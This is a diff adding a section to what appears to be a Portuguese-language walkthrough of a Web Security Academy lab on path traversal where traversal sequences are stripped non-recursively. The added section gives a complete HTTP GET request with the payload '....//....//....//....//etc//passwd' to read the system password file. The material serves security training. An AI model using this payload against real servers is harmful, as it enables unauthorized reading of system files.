@@ -31,6 +31,20 @@ Connection: close
 
 ````
 
+### >> 3. File path traversal, traversal sequences stripped non-recursively
+Crie uma requisição GET contendo o caminho do arquivo a ser lido
+
+````
+GET /image?filename=....//....//....//....//etc//passwd HTTP/1.1
+Host: acb91f041e530947c0f6088a004200cf.web-security-academy.net
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+Connection: close
+
+
+````
 
 
 
